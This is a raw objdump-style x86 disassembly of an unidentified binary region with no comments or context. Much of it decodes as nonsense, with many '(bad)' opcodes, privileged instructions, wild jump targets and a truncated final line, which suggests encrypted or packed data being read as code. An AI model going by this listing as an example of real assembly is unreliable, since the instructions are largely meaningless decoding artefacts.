  42ac0d:	cmp    al,0x0
  42ac10:	adc    dh,BYTE PTR [ebx]
  42ac12:	jge    0x42ac17
  42ac14:	mov    edi,DWORD PTR [ebx]
  42ac16:	jl     0x42ac27
  42ac18:	clc    
  42ac19:	dec    edi
  42ac1a:	jge    0x42ac1c
  42ac1c:	mov    eax,DWORD PTR [ebx]
  42ac1e:	jb     0x42ac28
  42ac20:	mov    ecx,DWORD PTR [ebp-0x8]
  42ac23:	mov    edi,edi
  42ac25:	xor    edx,DWORD PTR [eax]
  42ac27:	add    edi,DWORD PTR [ebx]
  42ac29:	mov    DWORD PTR [ebp-0x10],edi
  42ac2c:	inc    edi
  42ac2d:	pop    ebp
  42ac2e:	jge    0x42ac6b
  42ac30:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42ac34:	mov    edx,0xc05d87f0
  42ac39:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  42ac3d:	fimul  WORD PTR [eax]
  42ac3f:	fist   WORD PTR [ebp+0x1c]
  42ac42:	in     al,dx
  42ac43:	jne    0x42ac31
  42ac45:	mov    edi,DWORD PTR [edx-0x7a27a10]
  42ac4b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  42ac4f:	fdivp  st(0),st
  42ac51:	fild   WORD PTR [ebp+0x4510f85c]
  42ac57:	test   BYTE PTR [ebx+0x4d00fc02],cl
  42ac5d:	inc    ebp
  42ac5e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42ac64:	mov    ebp,DWORD PTR [ebx-0x4]
  42ac67:	adc    al,0x8b
  42ac69:	rcl    DWORD PTR [eax],0x48
  42ac6c:	mov    esi,0x7080803
  42ac71:	fiadd  WORD PTR [ebp+0x4d]
  42ac74:	(bad)  
  42ac75:	mov    edx,DWORD PTR [edx-0x4]
  42ac78:	mov    edx,DWORD PTR [ebp-0x4]
  42ac7b:	xor    ebx,DWORD PTR [ebx+0x330103]
  42ac81:	mov    DWORD PTR [edi+0x872dc],edi
  42ac87:	xlat   BYTE PTR ds:[ebx]
  42ac88:	into   
  42ac89:	ffreep st(6)
  42ac8b:	retf   0x6c7
  42ac8e:	iret   
  42ac8f:	dec    ebp
  42ac90:	inc    ebp
  42ac91:	mov    DWORD PTR [ebx],edi
  42ac93:	fmul   QWORD PTR [edi]
  42ac95:	dec    ebp
  42ac96:	jnp    0x42accb
  42ac98:	add    BYTE PTR [ebx],al
  42ac9a:	mov    ecx,DWORD PTR [esp+edi*8]
  42ac9d:	inc    ebp
  42ac9e:	dec    ebp
  42ac9f:	lea    esi,[ebx]
  42aca1:	add    DWORD PTR [ebx],eax
  42aca3:	jb     0x42ace0
  42aca5:	add    BYTE PTR [edi],cl
  42aca7:	inc    ebp
  42aca8:	imul   eax,edi,0x858bd800
  42acae:	cld    
  42acaf:	clc    
  42acb0:	mov    DWORD PTR [ebp+0x0],eax
  42acb3:	inc    DWORD PTR [eax]
  42acb5:	or     al,0xde
  42acb7:	sbb    bh,0x1
  42acba:	retf   
  42acbb:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  42acc2:	dec    ebp
  42acc3:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  42acc9:	enter  0x12de,0xdf
  42accd:	inc    ebp
  42acce:	pop    ebp
  42accf:	dec    DWORD PTR [ebx-0x257f0ff4]
  42acd5:	add    DWORD PTR [edx],edx
  42acd7:	add    BYTE PTR [ebp+0x50],dl
  42acda:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  42ace0:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  42ace7:	loopne 0x42ad00
  42ace9:	cdq    
  42acea:	push   ebp
  42aceb:	clc    
  42acec:	mov    eax,DWORD PTR [ebp-0x4]
  42acef:	xor    edx,edx
  42acf1:	add    esi,DWORD PTR [ebx]
  42acf3:	cmp    eax,DWORD PTR [ebx]
  42acf5:	hlt    
  42acf6:	cmp    DWORD PTR [ebx],esp
  42acf8:	or     al,BYTE PTR [ebp+0xf]
  42acfb:	mov    eax,DWORD PTR [edx]
  42acfd:	loopne 0x42acff
  42acff:	(bad)  
  42ad00:	mov    ecx,esi
  42ad02:	cld    
  42ad03:	pushf  
  42ad04:	pop    ebp
  42ad05:	sahf   
  42ad06:	mov    esi,DWORD PTR [edx]
  42ad08:	lock mov eax,eax
  42ad0b:	adc    BYTE PTR [ebx],al
  42ad0d:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42ad14:	xor    ebp,DWORD PTR [edi+0x50e45189]
  42ad1a:	dec    ebp
  42ad1b:	mov    ecx,DWORD PTR [ebx-0x31390304]
  42ad21:	(bad)  
  42ad22:	iret   
  42ad23:	inc    ebp
  42ad24:	(bad)  
  42ad25:	jne    0x42ad74
  42ad27:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  42ad2d:	(bad)  
  42ad2e:	cmp    ebx,eax
  42ad30:	je     0x42acb8
  42ad32:	add    edi,edi
  42ad34:	or     bh,bh
  42ad36:	dec    ebp
  42ad37:	inc    ebp
  42ad38:	mov    esi,DWORD PTR [ebx]
  42ad3a:	cld    
  42ad3b:	add    ecx,esi
  42ad3d:	cmp    ecx,DWORD PTR [eax-0xc]
  42ad40:	mov    edx,DWORD PTR [edi]
  42ad42:	or     BYTE PTR [ebp-0x7c],al
  42ad45:	mov    ebx,DWORD PTR [esi-0x7639cd18]
  42ad4b:	test   BYTE PTR [esi+ebx*4],cl
  42ad4e:	inc    ebp
  42ad4f:	xor    dh,BYTE PTR [eax]
  42ad51:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  42ad58:	jne    0x42ad21
  42ad5a:	mov    ebp,esp
  42ad5c:	fcomp  DWORD PTR [ebx]
  42ad5e:	add    BYTE PTR [ecx],al
  42ad60:	inc    DWORD PTR [ebp-0x75]
  42ad63:	(bad)  
  42ad64:	cld    
  42ad65:	add    al,0xce
  42ad67:	mov    ecx,edi
  42ad69:	cld    
  42ad6a:	inc    ebp
  42ad6b:	fidivr WORD PTR [ebx]
  42ad6d:	fbstp  TBYTE PTR [ebp-0x3e]
  42ad70:	mov    eax,DWORD PTR [eax]
  42ad72:	adc    BYTE PTR [ebx-0x3974038b],cl
  42ad78:	fadd   st,st(7)
  42ad7a:	add    BYTE PTR [ebp-0x1],al
  42ad7d:	mov    ecx,DWORD PTR [esp+edi*8]
  42ad80:	inc    ebp
  42ad81:	mov    bh,0xc7
  42ad84:	loopne 0x42adcb
  42ad86:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  42ad8c:	sbb    al,0x33
  42ad8e:	pushf  
  42ad8f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  42ad95:	mov    eax,edi
  42ad97:	cwde   
  42ad98:	inc    ebp
  42ad99:	inc    ebp
  42ad9a:	jne    0x42ad27
  42ad9c:	mov    esp,esp
  42ad9e:	clc    
  42ad9f:	add    al,0x4d
  42ada1:	mov    DWORD PTR [ebx],esi
  42ada3:	or     al,0x33
  42ada5:	inc    ebp
  42ada6:	lea    ecx,[ebx-0x398d13fd]
  42adac:	add    bh,al
  42adae:	inc    ebp
  42adaf:	ror    DWORD PTR [ebx+0x45d829],0x8b
  42adb6:	add    ebp,esp
  42adb8:	shufps xmm1,xmm3,0xc7
  42adbc:	(bad)  
  42adbd:	jmp    0x7487e8e6
  42adc2:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42adc8:	hlt    
  42adc9:	mov    ecx,DWORD PTR [edi]
  42adcb:	fadd   DWORD PTR [ebp+0x0]
  42adce:	xor    ecx,DWORD PTR [edi]
  42add0:	add    ecx,ecx
  42add2:	cmp    edi,edi
  42add4:	pmuludq mm7,QWORD PTR [edx+0x50]
  42add8:	(bad)  
  42add9:	jmp    0x42ad66
  42addb:	mov    edi,esp
  42addd:	or     al,0xc6
  42addf:	inc    ebp
  42ade0:	(bad)  
  42ade1:	mov    eax,DWORD PTR [ebp+0x10]
  42ade4:	jne    0x42ad6f
  42ade6:	mov    eax,DWORD PTR [ecx]
  42ade8:	clc    
  42ade9:	add    BYTE PTR [ebp-0x40],cl
  42adec:	xor    edx,DWORD PTR [eax-0x73]
  42adef:	jne    0x42adf2
  42adf1:	push   DWORD PTR [edx+0x8]
  42adf4:	add    BYTE PTR [ebp+0x45],al
  42adf7:	mov    ebp,ecx
  42adf9:	cld    
  42adfa:	add    BYTE PTR [ebp+0x0],cl
  42adfd:	xor    eax,DWORD PTR [ebp+0x3]
  42ae00:	lea    edi,[ebx]
  42ae02:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42ae08:	sub    eax,0x5d330e4d
  42ae0d:	lea    esi,[ebx]
  42ae0f:	add    DWORD PTR [ebx],eax
  42ae11:	jb     0x42adfc
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	inc    ebp
  42ae16:	add    bl,ch
  42ae18:	inc    ebp
  42ae19:	mov    esi,DWORD PTR [ebx]
  42ae1b:	or     al,0x3
  42ae1d:	(bad)  
  42ae1e:	mov    edi,eax
  42ae20:	in     al,dx
  42ae21:	scas   eax,DWORD PTR es:[edi]
  42ae22:	inc    ebp
  42ae23:	mov    esi,DWORD PTR [ebx]
  42ae25:	in     al,0x3
  42ae27:	add    al,0x89
  42ae29:	mov    ecx,DWORD PTR [eax+edi*8]
  42ae2c:	dec    ebp
  42ae2d:	(bad)  
  42ae2e:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3162]
  42ae35:	mov    ecx,eax
  42ae37:	cld    
  42ae38:	push   es
  42ae39:	dec    ebp
  42ae3a:	add    al,0x33
  42ae3c:	mov    DWORD PTR [ebx],eax
  42ae3e:	in     al,dx
  42ae3f:	cmp    DWORD PTR [ebp-0x67],eax
  42ae42:	mov    eax,DWORD PTR [ebp-0xba0068]
  42ae48:	mov    edx,DWORD PTR [ebp-0x4]
  42ae4b:	mov    ecx,DWORD PTR [ebp-0x18]
  42ae4e:	xor    ecx,DWORD PTR [ebp+0x3]
  42ae51:	cmp    DWORD PTR [ebx],0x8b32749d
  42ae57:	xor    edi,esp
  42ae59:	jmp    0xff76abab
  42ae5e:	add    ecx,DWORD PTR [ebp-0x3f]
  42ae61:	xor    ebx,DWORD PTR [edi]
  42ae63:	add    eax,ecx
  42ae65:	cmp    ebx,DWORD PTR [eax]
  42ae67:	mov    ecx,DWORD PTR [ebp-0x4]
  42ae6a:	mov    ecx,DWORD PTR [eax]
  42ae6c:	adc    BYTE PTR [ebp-0x80],al
  42ae6f:	jmp    0x42ae72
  42ae71:	mov    eax,DWORD PTR [eax]
  42ae73:	cld    
  42ae74:	mov    bh,0xc6
  42ae76:	push   ecx
  42ae77:	(bad)  
  42ae78:	jne    0x42aed8
  42ae7a:	dec    ecx
  42ae7c:	or     BYTE PTR [ecx+ebx*1],cl
  42ae7f:	push   ebp
  42ae80:	inc    ebp
  42ae81:	in     al,dx
  42ae82:	add    ebp,esp
  42ae84:	or     bh,al
  42ae86:	dec    ebp
  42ae87:	cld    
  42ae88:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  42ae8e:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  42ae92:	dec    DWORD PTR [ebx+0x45510cf4]
  42ae98:	mov    DWORD PTR [ebx+0x5745fc0c],ecx
  42ae9e:	mov    edx,DWORD PTR [ecx+0xc]
  42aea1:	xor    eax,esi
  42aea3:	mov    edx,0xc172c7
  42aea8:	inc    ebp
  42aea9:	mov    esi,DWORD PTR [ebp+0x8]
  42aeac:	mov    eax,edx
  42aeae:	call   0x84c775a3
  42aeb3:	add    DWORD PTR [esi-0x76bace00],ebx
  42aeb9:	mov    ebp,eax
  42aebb:	or     BYTE PTR [eax],dl
  42aebd:	jo     0x42af0c
  42aebf:	push   edi
  42aec0:	xor    esi,DWORD PTR [ebp+0x3]
  42aec3:	(bad)  
  42aec4:	pmulhuw mm0,mm1
  42aec7:	test   DWORD PTR [ebp-0x8],ecx
  42aeca:	mov    DWORD PTR [ebp-0x67],eax
  42aecd:	mov    eax,DWORD PTR [ebp-0x4]
  42aed0:	xor    edi,DWORD PTR [ebp-0x73]
  42aed3:	xor    eax,DWORD PTR [ebx]
  42aed5:	xor    esi,DWORD PTR [edx+0x3]
  42aed8:	add    BYTE PTR [ecx],bh
  42aeda:	inc    ebp
  42aedb:	(bad)  
  42aedc:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  42aee2:	mov    DWORD PTR [eax],0x750f0004
  42aee8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  42aeee:	lock add BYTE PTR [ebp+0x0],al
  42aef2:	mov    esi,DWORD PTR [ebp-0x2c]
  42aef5:	mov    ebp,edx
  42aef7:	or     al,0x72
  42aef9:	ja     0x42aefb
  42aefb:	mov    edx,esi
  42aefd:	cld    
  42aefe:	(bad)  
  42af01:	cli    
  42af02:	mov    esi,DWORD PTR [ebp-0x4]
  42af05:	cmp    ecx,esi
  42af07:	bswap  edi
  42af09:	(bad)
  42af0d:	mov    esi,DWORD PTR [ebp-0x4]
  42af10:	mov    esi,ecx
  42af12:	clc    
  42af13:	repnz add esi,DWORD PTR [ebp+0x45]
  42af17:	push   ebx
  42af18:	xor    eax,DWORD PTR [ebp+0x3]
  42af1b:	xor    bl,BYTE PTR [edi-0x64]
  42af1e:	pop    ebx
  42af1f:	jmp    0x42afe6
  42af24:	mov    esi,DWORD PTR [ebp-0x7d]
  42af27:	xor    ebp,DWORD PTR [eax]
  42af29:	lea    eax,[ebp-0x8]
  42af2c:	xor    eax,0xc7ef9cf2
  42af31:	neg    eax
  42af33:	ins    DWORD PTR es:[edi],dx
  42af34:	test   esi,edi
  42af36:	clc    
  42af37:	pop    esp
  42af38:	inc    ebp
  42af39:	or     BYTE PTR [ecx+0x450f0c7d],cl
  42af3f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42af45:	add    cl,al
  42af47:	jne    0x42aee7
  42af49:	mov    esi,DWORD PTR [edx]
  42af4b:	in     al,dx
  42af4c:	push   esi
  42af4d:	xor    BYTE PTR [ebp-0xe],dh
  42af50:	add    edi,esi
  42af52:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42af58:	add    cl,bh
  42af5a:	mov    edi,DWORD PTR [ebp+0x8]
  42af5d:	mov    DWORD PTR [ebp-0x14],esi
  42af60:	add    esi,DWORD PTR [ebp+0x3c]
  42af63:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  42af69:	mov    ah,0x30
  42af6b:	sahf   
  42af6c:	pushf  
  42af6d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42af73:	jne    0x42af00
  42af75:	mov    ecx,DWORD PTR [esp+ebp*8]
  42af78:	icebp  
  42af79:	icebp  
  42af7a:	shl    edx,0xf2
  42af7d:	(bad)  
  42af7e:	mov    ah,0x16
  42af80:	push   0xf8b9375
  42af85:	in     al,dx
  42af86:	jmp    0x42af79
  42af88:	add    dl,dh
  42af8a:	mov    edi,esi
  42af8c:	or     al,0x8
  42af8e:	inc    ebp
  42af8f:	jne    0x42af94
  42af91:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  42af97:	ret    
  42af98:	or     bh,bh
  42af9a:	jge    0x42af84
  42af9c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  42afa2:	xor    edi,eax
  42afa4:	add    esi,DWORD PTR [ebp-0x77]
  42afa7:	mov    ebx,esp
  42afa9:	clc    
  42afaa:	neg    DWORD PTR [ebp-0x7c]
  42afad:	xor    eax,DWORD PTR [eax]
  42afaf:	cmp    eax,DWORD PTR [eax]
  42afb1:	repz jne 0x42af49
  42afb4:	xor    eax,DWORD PTR [ecx]
  42afb6:	add    ebx,DWORD PTR [eax]
  42afb8:	mov    DWORD PTR [ebp-0x8],eax
  42afbb:	mov    eax,edi
  42afbd:	cld    
  42afbe:	lock pop eax
  42afc0:	test   DWORD PTR [ebx],esi
  42afc2:	clc    
  42afc3:	add    edx,DWORD PTR [edi-0x740bff77]
  42afc9:	fdivp  st(4),st
  42afcb:	test   ecx,esi
  42afcd:	(bad)  
  42afce:	jnp    0x42afcf
  42afd0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42afd6:	jae    0x42af63
  42afd8:	sub    edi,esp
  42afda:	(bad)  
  42afdb:	shl    DWORD PTR [eax-0x3e],0x89
  42afdf:	leave  
  42afe0:	call   0x819866ed
  42afe5:	in     al,dx
  42afe6:	(bad)  
  42afe7:	in     al,dx
  42afe8:	add    bh,al
  42afea:	mov    esp,edi
  42afec:	in     al,dx
  42afed:	test   DWORD PTR [ebp-0x8],edi
  42aff0:	mov    eax,DWORD PTR [ebp+0x2b]
  42aff3:	xor    al,0x3
  42aff5:	pushf  
  42aff6:	jnp    0x5731ac2f
  42affc:	xor    edx,DWORD PTR [edi-0x77]
  42afff:	push   ecx
  42b000:	loopne 0x42b035
  42b002:	jne    0x42afbf
  42b004:	mov    esi,DWORD PTR [edx-0x20]
  42b007:	add    BYTE PTR [ebp-0x3d],bh
  42b00a:	xor    eax,DWORD PTR [ebp-0x73]
  42b00d:	mov    edi,DWORD PTR [esi]
  42b00f:	cld    
  42b010:	jb     0x42afd8
  42b012:	add    bl,al
  42b014:	jne    0x42b05b
  42b016:	mov    edx,DWORD PTR [edi-0x10]
  42b019:	jge    0x42b098
  42b01b:	mov    esi,DWORD PTR [ebx]
  42b01d:	lock add ecx,DWORD PTR [ebp+0x3b]
  42b021:	xor    esi,DWORD PTR [ebp-0x77]
  42b024:	mov    esi,eax
  42b026:	lock inc ebp
  42b028:	jge    0x42b05f
  42b02a:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  42b031:	dec    ebp
  42b032:	mov    esi,DWORD PTR [ebx]
  42b034:	loopne 0x42afbf
  42b036:	jge    0x42b030
  42b038:	add    DWORD PTR [ebp-0x7d],eax
  42b03b:	cmc    
  42b03c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42b043:	dec    ebp
  42b044:	hlt    
  42b045:	xor    ebx,DWORD PTR [ebp-0x77]
  42b048:	mov    esi,esp
  42b04a:	in     al,0x45
  42b04c:	jge    0x42b07f
  42b04e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42b055:	dec    ebp
  42b056:	ins    BYTE PTR es:[edi],dx
  42b057:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  42b05d:	inc    ebp
  42b05e:	hlt    
  42b05f:	xor    eax,0xb88b9f75
  42b064:	add    al,0x95
  42b066:	icebp  
  42b067:	add    dl,dh
  42b069:	mov    DWORD PTR [ebp+0x20],ebx
  42b06c:	cmp    eax,DWORD PTR [ebp+0xf]
  42b06f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42b073:	fistp  WORD PTR [ebx+0x0]
  42b076:	inc    ebp
  42b077:	mov    ebx,DWORD PTR [edi+0xc]
  42b07a:	add    eax,eax
  42b07c:	inc    ebp
  42b07d:	test   BYTE PTR [ebx],dh
  42b07f:	add    eax,DWORD PTR [ebx]
  42b081:	add    BYTE PTR [esi+0x45],bl
  42b084:	ret    0x85
  42b087:	jnp    0x54433456
  42b08d:	inc    bp
  42b08f:	inc    ebp
  42b090:	xor    eax,0xc78a9cb9
  42b095:	add    ah,bl
  42b097:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  42b09d:	add    BYTE PTR [ebx+0x3],dl
  42b0a0:	mov    esi,0x708088b
  42b0a5:	cmp    esi,eax
  42b0a7:	setle  BYTE PTR [ecx-0x74fcffce]
  42b0ae:	mov    esp,edi
  42b0b0:	call   0x33cdf602
  42b0b5:	or     BYTE PTR [ebx],al
  42b0b7:	inc    ecx
  42b0b8:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  42b0be:	and    BYTE PTR [ebp-0x7074f0bb],al
  42b0c4:	lock add cl,al
  42b0c7:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  42b0ce:	mov    ch,0x45
  42b0d0:	clc    
  42b0d1:	xor    eax,DWORD PTR [ebp+0x3]
  42b0d4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  42b0da:	inc    ebp
  42b0db:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  42b0e1:	mov    edi,eax
  42b0e3:	mov    eax,DWORD PTR [ebp+0x3c]
  42b0e6:	mov    ecx,DWORD PTR [eax]
  42b0e8:	hlt    
  42b0e9:	inc    ebp
  42b0ea:	ror    DWORD PTR [ebx+0x818c45],0xf4
  42b0f1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42b0f7:	push   ebp
  42b0f8:	mov    edi,DWORD PTR [ebx]
  42b0fa:	in     al,dx
  42b0fb:	jne    0x42b0be
  42b0fd:	mov    eax,DWORD PTR [ebp-0x28]
  42b100:	add    DWORD PTR [eax],0xe8058dec
  42b106:	clc    
  42b107:	mov    eax,DWORD PTR [edi]
  42b109:	clc    
  42b10a:	add    dh,dl
  42b10c:	rol    WORD PTR [ebp-0x1],cl
  42b110:	mov    edx,DWORD PTR [eax+0x8]
  42b113:	jne    0x42b0d5
  42b115:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  42b11c:	inc    ebp
  42b11d:	push   esp
  42b11e:	test   DWORD PTR [ecx+0xf],ecx
  42b121:	sub    edx,esp
  42b123:	add    eax,DWORD PTR [eax]
  42b125:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  42b12b:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  42b132:	mov    eax,DWORD PTR [ecx]
  42b134:	and    BYTE PTR [eax],al
  42b136:	inc    edx
  42b137:	adc    BYTE PTR [eax],al
  42b139:	inc    ebp
  42b13a:	inc    cx
  42b13d:	push   esp
  42b13e:	or     BYTE PTR [ebp+0x0],dh
  42b141:	push   edx
  42b142:	enterw 0xc1,0x4d
  42b147:	mov    esp,DWORD PTR [esi+0x20]
  42b14a:	add    DWORD PTR [ecx-0x7b],eax
  42b14d:	add    eax,DWORD PTR [ebx]
  42b14f:	str    WORD PTR [eax+0x45]
  42b153:	lea    ecx,[ebx+0x45890801]
  42b159:	sbb    BYTE PTR [ebx],al
  42b15b:	dec    ebp
  42b15c:	cmp    al,0xf
  42b15e:	inc    ebp
  42b15f:	push   eax
  42b160:	mov    esi,DWORD PTR [ebx]
  42b162:	push   eax
  42b163:	add    eax,eax
  42b165:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  42b16c:	inc    ebp
  42b16d:	add    BYTE PTR ds:0x8b4d8c00,dh
  42b173:	xor    edx,esp
  42b175:	add    eax,esi
  42b177:	mov    ebx,eax
  42b179:	loopne 0x42b1c0
  42b17b:	dec    ebp
  42b17c:	mov    ecx,DWORD PTR [edi]
  42b17e:	cld    
  42b17f:	push   eax
  42b180:	xchg   DWORD PTR [ebx],esi
  42b182:	add    DWORD PTR [ebx],ebp
  42b184:	add    BYTE PTR [ebx],ch
  42b186:	or     BYTE PTR [ecx],bh
  42b188:	dec    ecx
  42b189:	loopne 0x42b18e
  42b18b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  42b191:	push   ebp
  42b192:	add    DWORD PTR [ebx+0x55100800],eax
  42b198:	dec    ebp
  42b199:	jmp    0x42b124
  42b19b:	mov    esp,DWORD PTR [eax]
  42b19d:	sbb    dl,dl
  42b19f:	inc    eax
  42b1a0:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42b1a6:	add    BYTE PTR [ebx+0x74528555],cl
  42b1ac:	push   ebp
  42b1ad:	div    DWORD PTR [ebx]
  42b1af:	and    eax,DWORD PTR [ebx]
  42b1b1:	add    edx,DWORD PTR [edx-0x30]
  42b1b4:	jno    0x42b141
  42b1b6:	inc    DWORD PTR [eax+eiz*1]
  42b1b9:	inc    ebp
  42b1ba:	push   eax
  42b1bb:	push   eax
  42b1bc:	mov    esp,DWORD PTR [edi-0x74beff1c]
  42b1c2:	mov    edi,esp
  42b1c4:	push   eax
  42b1c5:	inc    ebp
  42b1c6:	enter  0x458b,0x8
  42b1ca:	push   ecx
  42b1cb:	(bad)  
  42b1cc:	call   0x10cbba4
  42b1d1:	pop    ss
  42b1d2:	push   ebp
  42b1d3:	mov    ecx,DWORD PTR [ebx+0x489408]
  42b1d9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  42b1df:	push   ecx
  42b1e0:	jo     0x42b1ca
  42b1e2:	inc    DWORD PTR [edi]
  42b1e4:	or     BYTE PTR [eax],al
  42b1e6:	call   0xcdb930
  42b1eb:	fmul   QWORD PTR [ebp+0x55]
  42b1ee:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42b1f4:	mov    bh,0x8c
  42b1f6:	adc    al,0x9e
  42b1f8:	dec    esp
  42b1f9:	xor    bl,BYTE PTR [eax]
  42b1fb:	mov    ecx,DWORD PTR [ebp+0xc]
  42b1fe:	mov    eax,DWORD PTR [ebp-0x4]
  42b201:	mov    esi,DWORD PTR [edi-0x3148f924]
  42b207:	push   es
  42b208:	retf   
  42b209:	mov    BYTE PTR [ebp-0x30],0x3b
  42b20d:	inc    ebp
  42b20e:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42b215:	retf   0x83fc
  42b218:	into   
  42b219:	dec    ebp
  42b21a:	retf   
  42b21b:	mov    ecx,DWORD PTR [ebp-0x74]
  42b21e:	mov    eax,DWORD PTR [eax]
  42b220:	fdiv   QWORD PTR [ebx]
  42b222:	mov    bh,0x3
  42b224:	push   es
  42b225:	mov    esi,ecx
  42b227:	sbb    cl,dl
  42b229:	dec    ebp
  42b22a:	sar    DWORD PTR [ebx],cl
  42b22c:	push   ebp
  42b22d:	jne    0x42b23e
  42b22f:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42b235:	lea    ebx,[eax]
  42b237:	call   0xf4cc3dfe
  42b23c:	sbb    dh,dl
  42b23e:	add    edx,ebx
  42b240:	push   ebp
  42b241:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42b247:	push   ecx
  42b248:	mov    DWORD PTR [eax-0x30],edx
  42b24b:	test   DWORD PTR [edx],eax
  42b24d:	xadd   esp,esi
  42b250:	pop    es
  42b251:	add    cl,dl
  42b253:	mov    eax,ecx
  42b255:	or     al,0x45
  42b257:	(bad)  
  42b258:	push   eax
  42b259:	add    DWORD PTR [edx+0x0],eax
  42b25c:	add    ecx,DWORD PTR [ecx]
  42b25e:	and    dh,cl
  42b260:	call   0xc6bb30
  42b265:	add    DWORD PTR [ebp+0x0],edx
  42b268:	mov    esp,DWORD PTR [ebp+0x18]
  42b26b:	add    BYTE PTR [eax+0x24],cl
  42b26e:	xor    eax,DWORD PTR [eax]
  42b270:	add    esp,DWORD PTR [esi+0x3b]
  42b273:	inc    ebp
  42b274:	je     0x42b1f9
  42b276:	push   ecx
  42b277:	or     cl,BYTE PTR [ebp-0x77]
  42b27a:	add    eax,esi
  42b27c:	or     al,0x1e
  42b27e:	inc    eax
  42b27f:	add    BYTE PTR [ebx],al
  42b281:	data16 and BYTE PTR [ebp+0x50],al
  42b285:	sub    DWORD PTR [ecx],0x8
  42b288:	add    BYTE PTR [ebp-0x75],ah
  42b28b:	add    BYTE PTR [eax],bl
  42b28d:	enter  0x894d,0x8b
  42b291:	int3   
  42b292:	loopne 0x42b24e
  42b294:	rol    BYTE PTR [eax],0x33
  42b297:	lea    cx,[ebp+0xa]
  42b29b:	data16 jb 0x42b2e3
  42b29e:	add    BYTE PTR [ebx+0x44890855],cl
  42b2a4:	sbb    ah,al
  42b2a6:	inc    ebp
  42b2a7:	inc    edx
  42b2a8:	lldt   WORD PTR [edx+0x66]
  42b2ac:	xor    ecx,DWORD PTR [eax]
  42b2ae:	sub    ecx,DWORD PTR [eax]
  42b2b0:	mov    eax,DWORD PTR [eax]
  42b2b2:	or     al,0x66
  42b2b4:	ror    edx,cl
  42b2b6:	dec    ebp
  42b2b7:	inc    ebp
  42b2b8:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  42b2be:	cld    
  42b2bf:	or     BYTE PTR [edi+0x4501dd],dl
  42b2c5:	enter  0xeece,0xcb
  42b2c9:	(bad)  
  42b2ca:	dec    ebp
  42b2cb:	mov    al,0x8b
  42b2cd:	jmp    0xea27:0x450a3320
  42b2d4:	xchg   esi,ebp
  42b2d6:	add    edi,eax
  42b2d8:	add    BYTE PTR [eax+0x3f52ed55],bh
  42b2de:	push   ebp
  42b2df:	inc    ebp
  42b2e0:	xor    edx,eax
  42b2e2:	add    ebp,esi
  42b2e4:	push   edx
  42b2e5:	push   bp
  42b2e7:	inc    ebp
  42b2e8:	jmp    ecx
  42b2ea:	push   esp
  42b2eb:	(bad)  
  42b2ec:	inc    edx
  42b2ee:	sbb    al,0x33
  42b2f0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42b2f7:	add    BYTE PTR [ebp+0x49],0x8b
  42b2fb:	jmp    0xf98b:0x100041c8
  42b302:	xor    esi,DWORD PTR [edx+0x3]
  42b305:	mov    ecx,DWORD PTR [edi]
  42b307:	fmul   DWORD PTR [edx]
  42b309:	add    BYTE PTR [eax],al
  42b30b:	lea    eax,[ebx-0x4700273c]
  42b311:	add    al,0x4f
  42b313:	pop    DWORD PTR [eax]
  42b315:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  42b31b:	push   edx
  42b31c:	inc    WORD PTR [ebp+0x8]
  42b320:	mov    eax,0x514f4d
  42b325:	(bad)
  42b329:	add    al,al
  42b32b:	xor    DWORD PTR [ebx-0x74baf730],eax
  42b331:	test   DWORD PTR [esi+0x74],esp
  42b334:	inc    ebp
  42b335:	mov    DWORD PTR [eax+0xa4e08],edi
  42b33b:	add    BYTE PTR [ecx-0x76c435bb],cl
  42b341:	or     dh,cl
  42b343:	or     eax,0x8b8d5045
  42b348:	inc    ebp
  42b349:	mov    WORD PTR [ecx+0x3b8a00],?
